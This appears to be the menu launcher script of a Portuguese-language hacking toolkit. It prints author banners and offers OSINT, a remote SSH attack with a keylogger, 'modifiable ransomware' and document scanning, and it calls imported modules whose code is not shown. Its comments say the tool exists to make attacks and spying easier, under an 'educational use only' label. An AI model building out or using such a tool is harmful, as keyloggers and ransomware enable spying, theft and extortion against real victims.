import webbrowser
from colorama import Style, Fore, init
from time import sleep
from urls import Urls
from remote import servidor
import platform
from remote import Plataforma
init(autoreset=True)
"""
Author: P1UN
GITHUB:Hymjames
DESC: Use somente pra propositos educacions porfavor, o programa pode ser como espiao e facilitar,
em ataques de sistemas, se gostou porfavor deixe o like na minha pagina do tiktok e youtube,
apartir de la vais aprender como fazer ataques mais inteligentes, obrigado

"""
class Web:
    def __init__(self):
        p="""
        Autor: P1UN
        TIKTOK:P1UN-TECH
        YOUTUBE:
        FACEBOOK:
        Github:HYmjames
        Deixe um incentivo deixando likes nas paginas.

        Tutorial: Uso somente por questoes educacionais
        Este software tem como o proposito tornar a pesquisa mais eficientes pra facilidade de ataques

        
        
        """
        print(p)
        sleep(2)

    def executar(self):
        if True:
            #webbrowser.open("tiktok/p1un-tech")
            print("Obrigado")
            sleep(5)
            #webbrowser.open_new_tab('youtube/p1un-tech')

def Options():
    show=f"""
    Software-Uso somente pra propositos educacionais
    Author:Jamal Achire
    Tiktok:P1UN-TECH
    Youtube:P1UN-TECH

        {Fore.GREEN}    ____ _____  ___   __
                      / __ <  / / / / | / /
                     / /_/ / / / / /  |/ / 
                    / ____/ / /_/ / /|  /  
                   /_/   /_/\____/_/ |_/   
                  / 
                 /
        .--. _  /
       |o_o |
       |:_/ |
      //   \ \\
     (|     | )
    /'\_   _/`\\
    \___)=(___/  🇲🇿
{Style.RESET_ALL}

        {Fore.RED}[1]OSINT
        {Fore.YELLOW}[2]Ataque remoto via (SSH  & KEYLOGGER -WINDOWS & LINUX)
        {Fore.WHITE}[3]Ransoware Modificavel
        {Fore.CYAN}[4]Varedura de arquivos:[docx,txt,pdf]
        
        """
    print(show)
    try:
        usuario=int(input("Selecione: "))
        if usuario==1:
            print(f"{Fore.RED} Opcao:{usuario}")
            Urls()
        elif usuario==2:
            print(f"{Fore.YELLOW} Opcao {usuario}")
            Plataforma()
            servidor()
            
    except ValueError:
        print("Numero invalido porfavor selecione o numero correto")
if __name__=='__main__':
    run=Web()
    run.executar()
    Options()


